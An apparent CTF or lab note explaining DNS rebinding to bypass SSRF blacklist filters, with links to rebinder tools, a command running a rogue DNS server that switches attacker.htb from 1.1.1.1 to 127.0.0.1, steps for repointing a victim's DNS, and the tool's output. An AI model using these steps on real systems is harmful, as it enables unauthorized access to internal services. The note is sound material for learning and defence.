This type of SSRF bypass is very useful when the blacklist filtering are more strict and let's you bypass them by playing around with DNS. DNS rebound occurs when we setup a a very low
TTL(time to live says how often client need to check again with DNS server) and by setting a very low value we can trick the app first by pointing to a ledigt value ex **attacker.htb=1.1.1.1 with ex TTL=1 --> conseguently change** 
it to **attacker.htb=127.0.0.1** by doing so the victim will perform redirect follows that goes from **1.1.1.1 --> 127.0.0.1** and successfully bypass advanced filters.
OBS: the timing is KING here so you must be precise!

## How to exploit?
1)If the victim have access to Internet?
You can use https://lock.cmpxchg8b.com/rebinder.html to rebind both to 127.0.0.1 & 1.1.1.1 and with several try you might be able to bypass it by leveraging a DNS rebind!
2)If the victim HAVEN'T access to Internet?
You must setup a local fake DNS server with: https://github.com/Crypt0s/FakeDns  OR   https://github.com/mogwailabs/DNSrebinder
Next you must edit the DNS config on the victim to point to your rogue DNS server and this last one will perform the rebind job for you!

## DNSRebind locally (if victim got not WAN access):
1)Setup a local DNS rebinder: `python3 dnsrebinder.py --ip 1.1.1.1 --domain attacker.htb --rebind 127.0.0.1 --counter 1 --udp --tcp`
(This will listen for tcp/udp requests and resolver **attacker.htb=1.1.1.1** first and after one request switch to 127.0.0.1)
2)Access to victim and edit the DNS/Hosts config to use your IP as dns server so it will rebind effectively
(In our example we had access to webmin portal on the victim where we could effectively change the local DNS settings and point it to our machine)
3)Running the SSRF and asking the rogue attacker.htb domain(http://attacker.htb/flag) should resolve to localhost and successfully bypass the block
```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/DNSrebinder]
└─# python3 dnsrebinder.py --ip 1.1.1.1 --domain attacker.htb --rebind 127.0.0.1 --counter 1 --udp --tcp
Starting nameserver...
UDP server loop running in thread: Thread-1 (serve_forever)
TCP server loop running in thread: Thread-2 (serve_forever)
Got a request for attacker.htb. Type: A
------------------------ Counter for host  attacker.htb.   1
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3052
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;attacker.htb.                  IN      A
;; ANSWER SECTION:
attacker.htb.           0       IN      A       1.1.1.1
Got a request for attacker.htb. Type: A
------------------------ Counter for host  attacker.htb.   2
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 788
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;attacker.htb.                  IN      A
;; ANSWER SECTION:
attacker.htb.           0       IN      A       127.0.0.1
---- Reply:
```
